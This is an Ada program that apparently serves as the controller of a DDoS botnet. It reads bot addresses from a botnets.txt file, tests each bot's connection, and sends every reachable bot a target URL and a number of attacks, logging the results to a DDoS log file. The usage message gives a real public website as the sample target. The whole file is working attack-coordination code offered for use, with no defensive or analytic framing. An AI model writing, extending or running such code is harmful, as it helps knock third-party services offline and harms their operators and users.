with Ada.Text_IO; use Ada.Text_IO;
with GNAT.Sockets; use GNAT.Sockets;
with Ada.Exceptions; use Ada.Exceptions;
with Ada.Command_line;
with Ada.Task_Identification;  use Ada.Task_Identification;

procedure main is

	address: Sock_Addr_Type;
	client: Socket_Type;
	channel: Stream_Access;
	targetURI : String := "";
	isSuccessful : boolean;
    	Utfil : File_Type;
    	BotnetsFile : File_Type;


	procedure initiate_connection (botAddress: in String; portNumber: in Port_Type) is
	begin
		GNAT.Sockets.Initialize;
		Create_Socket (client);
		address.Addr := Inet_Addr(botAddress);
		address.Port := portNumber;

		Connect_Socket (client, address);
		channel := Stream (client);

	end initiate_connection;

	procedure close_connection is
	begin
		Close_Socket (client);
	end close_connection;

	function check_bot_connection (botAddress: in String) return boolean is
	begin
		initiate_connection(botAddress, 2345);
		close_connection;
		return true;
		exception
			when SOCKET_ERROR =>
				return false;
	end check_bot_connection;


	procedure attack_order (botAddress, targetURI: in String; numberOfAttacks: in integer) is
	begin
		initiate_connection(botAddress, 2346);
		String'Write(channel, targetURI);
		String'Write(channel, Integer'Image(numberOfAttacks));
		close_connection;
	end attack_order;


	procedure read_botnets_file_and_attack(AttackTarget: in String; numberOfAttacks: in integer) is

	BotsFile : File_Type;

	begin

		begin
			Open(BotsFile, in_file, "botnets.txt");
	Exception
		when Name_Error =>
			put_line(Utfil, "No botnets.txt file found");
			put_line("No botnets.txt file found");
			Abort_Task (Current_Task);
		end;

	loop
		declare
	botAddress : String := Get_Line (BotsFile);
	begin
		isSuccessful := check_bot_connection(botAddress);
		if(isSuccessful) then
			Put(Utfil, "Connected to botnet: ");
			Put(Utfil, botAddress);
			Put_Line(Utfil, " Sending attack request!");
			attack_order(botAddress, AttackTarget, numberOfAttacks);
			put_line(Utfil, "Attack is successful");
		else
			put(Utfil, "Botnet: ");
			put(Utfil, botAddress);
			put(Utfil, " unavailable");
		end if;
	end;


	end loop;

	Close (BotsFile);
	exception
	when End_Error =>
	if Is_Open(BotsFile) then
	 Close (BotsFile);
	end if;

end read_botnets_file_and_attack;



begin
	if (Ada.Command_line.Argument_Count /= 2) then
		put_line("Usage: ./main addressToAttack(e.g. http://www.google.pl) numberOfAttacks(e.g. 3)");
		Abort_Task (Current_Task);
	end if;

	begin
		Open(Utfil, Append_File, "ddos_logs.txt");
	Exception
		when Name_Error =>
			Create(Utfil, Out_File, "ddos_log.txt");
	end;
	Put_Line(Utfil, "Started");
	Put_Line(Utfil, "Looking for botnets...");
	Put_Line(Utfil, "Opening botnets.txt file");

	read_botnets_file_and_attack(Ada.Command_line.Argument(1), Integer'Value(Ada.Command_line.Argument(2)));


	Close(Utfil);


end main;
